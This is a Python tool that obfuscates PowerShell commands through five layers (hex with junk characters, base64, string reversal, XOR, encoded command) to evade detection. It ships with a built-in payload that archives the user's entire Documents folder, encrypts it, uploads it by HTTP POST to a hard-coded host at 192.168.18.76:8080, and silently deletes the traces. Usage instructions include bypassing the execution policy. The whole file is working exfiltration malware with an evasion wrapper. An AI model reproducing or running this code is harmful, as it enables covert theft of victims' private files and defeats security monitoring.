#!/usr/bin/env python3
import base64
import random
import string

def obfuscate_powershell(command):
    """
    Obfuscates a PowerShell command with multiple layers:
    1. Hex encoding
    2. Split hex digits with random characters + reconstruction loop
    3. Base64 encoding
    4. Reverse the base64
    5. XOR encryption with random key
    """
    
def obfuscate_powershell(command):
    import itertools

    # Layer 1: Hex encode
    hex_encoded = command.encode('utf-8').hex()

    # Layer 2: Group using 1-2-3 pattern with random chars inserted after each group
    all_chars = string.printable.strip().replace("'", "")  # Avoid breaking string quotes
    grouped = []
    i = 0
    group_sizes = [1, 2, 3]
    group_iter = itertools.cycle(group_sizes)

    while i < len(hex_encoded):
        group_size = next(group_iter)
        group = hex_encoded[i:i+group_size]
        if group:
            grouped.append(group + random.choice(all_chars))
        i += group_size

    obfuscated_string = ''.join(grouped)

    # PowerShell reconstruction logic (same pattern: 1, 2, 3)
    reconstruction_ps = (
        f"""$s='{obfuscated_string}';$r='';$i=0;$p=0;while($i-lt$s.Length){{$t=@(1,2,3)[$p%3];$c=[Math]::Min($t,$s.Length-$i);if($c-gt0){{$r+=$s.Substring($i,$c);$i+=$c}};$i+=[Math]::Min(1,$s.Length-$i);$p++}};$h=$r;if($h.Length%2-ne0){{$h=$h.Substring(0,$h.Length-1)}};[System.Text.Encoding]::ASCII.GetString(@(for($j=0;$j-lt$h.Length;$j+=2){{[Convert]::ToByte($h.Substring($j,2),16)}}))|iex"""
    )

    print(reconstruction_ps)

    # Layer 3: Base64 encode the reconstruction string
    b64_encoded = base64.b64encode(reconstruction_ps.encode('utf-8')).decode('utf-8')
    command = f"[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{b64_encoded}'))|iex"

    # Layer 4: Reverse the string
    reversed_b64 = command[::-1]
    escaped_reversed_b64 = reversed_b64.replace("'", "''")
    command = f"$r ='{escaped_reversed_b64}';$r[-1..-($r.Length)] -join '' | iex"

    # Layer 5: XOR encryption with random key
    xor_key = random.randint(1, 255)
    xor_encrypted_bytes = bytes(ord(char) ^ xor_key for char in command)
    xor_b64 = base64.b64encode(xor_encrypted_bytes).decode('utf-8')

    final_ps_code = f"""
$x={xor_key};$c='{xor_b64}';
$xd=[System.Convert]::FromBase64String($c);
$rd='';foreach($b in $xd){{$rd+=[char]($b -bxor $x)}};
iex $rd
""".strip().replace('\n', '')

    cmdline_command = f"""powershell -enc {base64.b64encode(final_ps_code.encode('utf-16le')).decode('utf-8')}"""
    ps1_b64 = base64.b64encode(final_ps_code.encode('utf-8')).decode('utf-8')
    ps1_content = f"[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{ps1_b64}'))|iex"

    return cmdline_command, ps1_content, {
        'original': command,
        'hex': hex_encoded,
        'obfuscated': obfuscated_string,
        'reconstruction': reconstruction_ps,
        'base64': b64_encoded,
        'reversed': reversed_b64,
        'xor_key': xor_key,
        'xor_encrypted': xor_b64,
        'cmdline': cmdline_command,
        'ps1_file': ps1_content
    }


def main():
    # Get PowerShell command from user
    ps_command = """$AAAAAAAAAAAAAABBBBBIIIiiAB='0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!@#$%^&()_+-=[]{}~';$aadsfjkh=-join((1..15)|ForEach{$AAAAAAAAAAAAAABBBBBIIIiiAB[(Get-Random -Maximum $AAAAAAAAAAAAAABBBBBIIIiiAB.Length)]});$fnsdadkj="$env:TEMP\$aadsfjkh.zip";$cvmz="$env:TEMP\$aadsfjkh.enc";try{Get-ChildItem "$env:USERPROFILE\Documents" -Recurse -File|Where-Object{-not $_.PSIsContainer -and $_.Name -notlike "*transcript*" -and $_.Name -notlike "*.tmp"}|Compress-Archive -DestinationPath $fnsdadkj -CompressionLevel Fastest -ErrorAction SilentlyContinue;if(Test-Path $fnsdadkj){$pqoero=New-Object byte[] 16;$dma=New-Object byte[] 16;$zfsfdm=[System.Security.Cryptography.RNGCryptoServiceProvider]::Create();$zfsfdm.GetBytes($pqoero);$zfsfdm.GetBytes($dma);$zfsfdm.Dispose();$dmafnaas=[System.Security.Cryptography.Aes]::Create();$dmafnaas.Key=$pqoero;$dmafnaas.IV=$dma;$encryptor=$dmafnaas.CreateEncryptor();$dfnalkns=[System.IO.File]::ReadAllBytes($fnsdadkj);$agbaghb=$encryptor.TransformFinalBlock($dfnalkns,0,$dfnalkns.Length);$dmafnaas.Dispose();$combinedBytes=$pqoero+$agbaghb+$dma;[System.IO.File]::WriteAllBytes($cvmz,$combinedBytes);Remove-Item $fnsdadkj -Force -ErrorAction SilentlyContinue;iwr -Uri "http://192.168.18.76:8080/upload" -Method Post -InFile $cvmz -ContentType "application/octet-stream" -Headers @{"X-Filename"=(Split-Path $cvmz -Leaf)} -ErrorAction SilentlyContinue|Out-Null;if(Test-Path $cvmz){Remove-Item $cvmz -Force -ErrorAction SilentlyContinue}}}catch{} """
    
    if not ps_command.strip():
        print("Error: Please provide a PowerShell command")
        return
    try:
        cmdline_cmd, ps1_cmd, layers = obfuscate_powershell(ps_command)
        
        print(f"\n1. COMMAND LINE VERSION:")
        print("-" * 30)
        print(cmdline_cmd)
        print(f"\n2. PS1 FILE VERSION:")
        print("-" * 20)
        print(ps1_cmd)
        print("="*60)
        
        # Show how to use both versions
        print(f"\nUsage:")
        print(f"Command line: Copy and paste the command line version into cmd/terminal")
        print(f"PS1 file: Save the PS1 version to a .ps1 file and run with 'powershell -ExecutionPolicy Bypass -File script.ps1'")
        print(f"\nBoth will execute: {ps_command}")
        
    except Exception as e:
        print(f"Error during obfuscation: {e}")

if __name__ == "__main__":
    main()